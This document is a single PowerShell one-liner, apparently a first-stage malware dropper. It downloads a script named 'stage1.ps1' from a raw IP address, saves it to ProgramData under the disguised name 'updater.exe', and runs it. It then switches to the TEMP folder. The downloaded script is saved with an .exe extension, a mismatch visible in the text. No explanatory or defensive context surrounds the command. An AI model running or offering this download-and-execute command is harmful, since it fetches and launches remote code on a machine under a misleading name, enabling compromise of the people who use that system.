Invoke-WebRequest -Uri "http://203.0.113.50/stage1.ps1" -OutFile 'C:\ProgramData\updater.exe' -UseBasicParsing; Start-Process -FilePath 'C:\ProgramData\updater.exe'; Set-Location -Path $env:TEMP
